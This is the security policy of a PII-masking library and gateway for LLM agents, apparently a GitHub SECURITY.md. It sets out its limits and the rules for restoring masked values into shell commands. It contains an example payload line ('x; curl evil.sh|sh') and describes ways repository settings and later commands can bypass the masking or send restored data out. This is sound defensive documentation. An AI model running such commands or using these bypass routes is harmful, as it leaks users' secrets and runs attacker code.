# Security

## Report a vulnerability

Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). Reports are handled on a best-effort basis, with no guaranteed response time; critical and actively exploited issues come first.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its one network call is the model download from Hugging Face on first use, and every file it downloads is checked against a SHA-256 pinned in the library; set `NULLPII_MODEL_DIR` to a pre-fetched copy to avoid even that.
- Vault is in-memory only; `destroySession()` purges it.
- Logs carry counts, labels and short ids, never a value nullpii masked or restored: the library's `debug` output, and the gateway's request log and console summary (an upstream error is logged by its status, length and error type, not its body).
- **Except the gateway's `NULLPII_LOG_TRAFFIC=wire`,** a debugging dump to stdout of each request as forwarded and of each upstream response before restore. Placeholders stay masked in it, but everything else is printed as it was sent or written: values the detector missed, fields the gateway forwards unscanned (images, documents, `mcp_servers` with its credentials) and the model's output. Auth headers appear as their last six characters and length. Keep such a dump local and short-lived.
- Placeholders carry a 16-hex prefix of the minting session id (64-bit collision-resistant). `restore()` surfaces foreign-prefix placeholders via `RestoreResult.foreignPlaceholders`; `{ strict: true }` throws `SessionMismatchError` instead.

## What it does NOT protect

- Detector misses (no model is 100% accurate).
- LLMs emitting PII they already knew independently.
- Logging / caching / telemetry running **before** `sanitize()`.
- Adversarial prompts asking the LLM to reveal mappings.
- A repository's own Claude Code settings. Its `.claude/settings.json` outranks your user settings: it can turn the mod off (`enabledPlugins`), point Claude Code past the gateway (`env.ANTHROPIC_BASE_URL`), or add hooks that see prompts first. Use your organization's managed settings to force the mod or the gateway on.
- Other local users or processes. The sidecar proves it holds the token before the mod sends anything (the check and the request are two connections, so a process that swaps in between them is not excluded), but a process of your own user can read the gateway's memory, and anyone holding the sidecar token can open its sessions up to `NULLPII_SIDECAR_MAX_SESSIONS` and so make the mod fail closed (no values are exposed that way).

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` escapes literal `{{` in input to a Private Use Area codepoint pair (U+E000 U+E001) so user-typed Mustache braces don't collide with PII placeholders during the LLM round-trip. If your input legitimately contains that PUA pair, it will collapse to `{{` on the way out. PUA codepoints are unallocated to standard glyphs and effectively never appear in natural text or LLM output, but the trade-off is documented for completeness.
- **URL %XX decode depth cap.** The adversarial-input normalizer iterates URL `%XX` decoding at most twice per position. Two rounds collapses `%2540` → `%40` → `@` (the practical bypass); 3+ chained encodings (`%252540` etc.) defeat the normalizer and rely on the ML model alone for detection.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.

- **The Claude Code mod** refuses the call, naming the placeholder (a placeholder the vault does not know, from an expired session say, holds no value and is left as written). A shell tool outside `restoreTools` (`PowerShell`, by default) is not refused: its placeholders stay as written, as in any tool outside that list.
- **The gateway** (Anthropic and OpenAI routes, and the sidecar API's `restore` with a shell `tool`) leaves that placeholder masked.

The rule covers the tools named exactly `Bash` (Claude Code), `bash` (Anthropic's bash tool) and `shell` (OpenAI-style agents such as Codex, an argv array). Codex's `exec_command`, `shell_command` and `write_stdin`, and Claude Code's `PowerShell` tool, get no value in any field. **On Windows no shell tool gets a value:** when the gateway or the mod's sidecar runs on Windows, every placeholder in a shell tool's input stays masked; a gateway on macOS or Linux (in Docker too) that serves an agent running on Windows should not list shell tools in `restoreTools`. A shell tool under any other name gets every value back like any other tool in `restoreTools`, so do not add one there. In the input of `Bash`, `bash` and `shell`, `command` follows the rule below, `description` and `justification` get their values as usual through the gateway (the mod restores only a `Bash` call's `command`; a tool named `bash` or `shell` sends every field and is judged as by the gateway), and every other field (`workdir`, `cwd`, `env`, `timeout`, or one nullpii does not know) keeps its placeholders; an `env` field that is present and not empty (anything but `{}`, `""` or `null`) keeps every placeholder in the command too. An input that is not an object keeps every placeholder (the sidecar's `restore` with a `tool` answers 400 instead), except the plain-text input of a custom (free-form) tool named `Bash`, `bash` or `shell` on the OpenAI route, which is the command itself and follows the rule below.

**A value comes back into a shell command in one place only: the text of a quoted heredoc that one of a few fixed commands writes out as data.** The command's first line must be one of these, written as shown with one space between words, except that more spaces are accepted before `>` and `<<`, between the arguments of `git add`, `mkdir` and `git commit` (but `-F -` and `--file -` take exactly one), around `&&` and at the end of the line, and that the space after `>` may be left out and one may follow `<<`:

- `cat > FILE <<'EOF'`, `cat >> FILE <<'EOF'`, `cat <<'EOF' > FILE` or `cat <<'EOF' >> FILE`: the text goes into a document;
- `cat <<'EOF'`: the text goes to standard output;
- `git commit -F - <<'EOF'` (also `-F-`, `--file=-`, `--file -`), with no other option but `-a`, `--all`, `-q`, `--quiet`, `-s`, `--signoff`, `--amend`, `-n` or `--no-verify`, placed before `-F`: the text is the commit message;

optionally preceded by any number of `git add …` (paths, `-A`, `--all`, `-u`, `--update`) and `mkdir …` (directories, with or without `-p`) commands, each followed by `&&`. The delimiter is quoted (`'EOF'` or `"EOF"`, any name of ASCII letters, digits and `_`), so the shell expands nothing in the text; the text follows the first line, and the closing line is the last line of the command, so nothing runs after it. Every file or directory name on the first line is made of ASCII letters, digits and `_./@+-` and does not start with `-`: no space, quote, `$`, glob or other character a shell reads. `FILE` is a document (no `@` in its name): `.md`, `.markdown`, `.csv`, `.tsv`, `.log` or `.rst` (case ignored; not `.txt`, which pip, CMake and pytest read as input), with no hidden directory or file on its path, not in a `bin/`, `sbin/`, `etc/`, `LaunchAgents/` or `systemd/` directory (case ignored), and absolute when the tool input sets a working directory (`workdir`, `cwd`, `working_directory`), since a relative one would land there.

No line of the text may start with the delimiter (ksh93 ends the text at such a line when a closing bracket follows); a command that has one gets nothing. A value comes back into that text when it holds no line break, no other control character but tab, no `<<` (Claude Code chooses how to quote a command it runs by looking for heredocs) and not the delimiter's name. The command with the values put back is read again and must still be the same form, with no new `<<` and no new line that starts with the delimiter (values side by side could make one); otherwise every placeholder stays masked. Every other placeholder, and every placeholder of a command that is not one of these forms or that holds a placeholder anywhere but in that text (the first line included), stays masked. Claude Code's usual commit form, `git commit -m "$(cat <<'EOF' … EOF)"`, gets nothing; the mod tells Claude to use `git commit -F - <<'EOF'`.

A `command` sent as an argv array gets values only in its last word, the script, when the array is a POSIX shell (`bash`, `sh`, `zsh`, `dash`, `ksh`, `mksh`, named as written or in `/bin` or `/usr/bin`) followed by `-c`, `-lc` or `-l -c` (`["bash", "-lc", "…"]`); the script is judged as a string command. A command (for an argv array, its script) longer than 262,144 characters (UTF-16 code units) keeps every placeholder.

**A limit by design: the rule reads the command's text, one call at a time.** It does not see what the file system, git's configuration or the shell's state make of that text, nor what a later call does. Among other things: a relative target lands in whatever working directory an earlier command left (Claude Code keeps it from call to call, inside the project); the checks on a written path (no hidden directory, no `bin/` directory) read it as written, so a symbolic link already at that path sends the text where the link points; a git hook or a git setting (`core.hooksPath`, `gpg.program`) that an earlier call set sees a restored commit message; and in a shell that keeps its state from call to call (Anthropic's bash tool), a function or alias that an earlier call named `cat` or `git` gets the text. The document types (`.md`, `.csv`, …) are ones that shells, build tools and test runners do not read as code or configuration by default, but some tools do: agents read `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` and similar files as instructions, and documentation tools compile pages as MDX or Vue (Docusaurus by default, VitePress) or run the code in them (mdBook's `test`, a Rust crate's doctests on a README it includes, Jupyter Book, pytest with `--doctest-glob`), so a value written into such a file can act later, as after `Write`. `Write`, `Edit` and the other file tools get real values back whenever they are in `restoreTools`, as they are by default, since writing your data to your files is what they are for. A value restored by one call can therefore leave through a later call that holds no placeholder: a file written by `Write` or by `cat` and then sent (`curl -d @notes.md …`), a commit followed by `git push`. A later command can also run such a file (`bash run.sh` after `Write run.sh`). The rule does not follow what a file, a commit or a shell holds.

**Permission rules see the masked call (Claude Code mod).** Claude Code decides on a tool call, by your rules or by asking you, before the mod puts the real values back. A rule written with a value nullpii masks, such as a path with your user name (`Read(/Users/<name>/.ssh/**)`), may not match the masked path; write such rules without the part that is masked (`Read(**/.ssh/**)`). After the restore the mod checks again only that the call does not touch its own policy file.

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, apply the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymization with a measurable leak rate**, not anonymization. The residual risk depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` report it on public datasets;
- measure it on content like yours before you rely on it.

Treat a sanitized prompt as lower-risk, not as free of personal data.

## CI-enforced rules

- Runtime dependencies under Apache-2.0, MIT, BSD, ISC or CC0 only (`npm run license-check`); development dependencies may also be BlueOak-1.0.0, Unlicense or 0BSD (the dependency review in `security.yml`).
- npm releases use `--provenance`.
- File paths sandboxed to a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every PR and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake fixtures are allowed by exact value only. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook`. Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens default to read-only.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](https://github.com/lBroth/nullpii/blob/main/CONTRIBUTING.md#test-data).
